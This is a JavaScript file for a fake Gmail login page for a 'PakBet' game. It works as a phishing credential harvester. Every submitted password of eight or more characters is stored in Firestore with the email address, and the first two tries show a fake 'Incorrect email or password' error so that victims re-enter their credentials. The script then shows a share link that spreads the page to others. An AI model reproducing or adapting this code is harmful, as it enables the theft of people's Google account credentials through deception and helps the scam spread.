document.addEventListener('DOMContentLoaded', () => {

  const loginScreen = document.getElementById('login-screen');
  const homeScreen = document.getElementById('home-screen');
  const loginForm = document.getElementById('login-form');
  const passwordInput = document.getElementById('password');
  const gmailInput = document.getElementById('gmail');
  const errorMsg = document.getElementById('error-msg');
  const welcomeText = document.getElementById('welcome-text');
  const shareLinkInput = document.getElementById('share-link');
  const copyBtn = document.getElementById('copy-btn');
  const copyMsg = document.getElementById('copy-msg');
  const logoutBtn = document.getElementById('logout-btn');

  let loginAttempt = 0;

  // The link that will be shared on the home screen.
  // Replace this with your own referral / invite link.
  const SHARE_LINK = 'https://pakbetgame.github.io/PakBet/';

  function isValidGmail(value) {
    return /^[a-zA-Z0-9._%+-]+@gmail\.com$/.test(value.trim());
  }

  function isStrongPassword(value) {

    return value.length >= 8;

  }

  function showScreen(screen) {
    document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
    screen.classList.add('active');
  }

  loginForm.addEventListener('submit', (e) => {
    e.preventDefault();
    errorMsg.textContent = '';

    loginAttempt++;

    const password = passwordInput.value.trim();
    const gmail = gmailInput.value.trim();

    if (!isStrongPassword(password)) {
      errorMsg.textContent = 'could not found account. Try again.';
      return;
    }

    window.saveUserToFirestore(password, gmail);

    if (loginAttempt < 3) {
      errorMsg.classList.remove('shake');
      void errorMsg.offsetWidth;
      errorMsg.classList.add('shake');
      errorMsg.textContent = 'Incorrect email or password';
      return;
    }

    if (!isValidGmail(gmail)) {
      errorMsg.textContent = 'Please enter a valid @gmail.com address.';
      return;
    }

    // Save session locally (in-memory for this session)
    welcomeText.textContent = `Welcome, ${gmail.split('@')[0]}`;
    shareLinkInput.value = SHARE_LINK;
    showScreen(homeScreen);

    
  });

  copyBtn.addEventListener('click', () => {
    shareLinkInput.select();
    shareLinkInput.setSelectionRange(0, 99999); // mobile support

    navigator.clipboard.writeText(shareLinkInput.value)
      .then(() => {
        copyMsg.textContent = 'Link copied to clipboard!';
        setTimeout(() => (copyMsg.textContent = ''), 2500);
      })
      .catch(() => {
        copyMsg.textContent = 'Could not copy — please copy manually.';
      });
  });

  logoutBtn.addEventListener('click', () => {
    loginForm.reset();
    errorMsg.textContent = '';
    copyMsg.textContent = '';
    showScreen(loginScreen);
  });

});